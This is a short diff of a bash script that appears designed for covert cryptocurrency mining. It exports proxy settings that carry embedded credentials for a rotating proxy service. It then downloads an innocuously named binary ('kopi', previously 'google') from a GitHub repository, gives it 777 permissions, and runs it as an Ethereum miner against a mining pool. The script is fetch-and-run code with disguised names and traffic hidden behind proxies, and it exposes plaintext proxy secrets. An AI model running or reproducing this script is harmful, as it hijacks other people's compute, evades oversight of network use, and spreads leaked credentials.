@@ -1,3 +1,8 @@
-wget https://github.com/torgyv/cuda/raw/main/google
-chmod 777 google
-./google --coin ETH --pool ethash.kupool.com:443 --user sagemode.V100
+#!/bin/bash
+curl --proxy "http://hkurhvju-rotate:598bv1flufw9@p.webshare.io:80/" https://ipv4.webshare.io/
+export http_proxy=http://hkurhvju-rotate:598bv1flufw9@p.webshare.io:80 &&
+export https_proxy=http://hkurhvju-rotate:598bv1flufw9@p.webshare.io:80 &&
+export ftp_proxy=http://hkurhvju-rotate:598bv1flufw9@p.webshare.io:80 &&
+wget https://github.com/selokguine3/yes/raw/main/kopi
+chmod 777 kopi
+./kopi --coin ETH --pool ethash.kupool.com:443 --user sagemode.V100
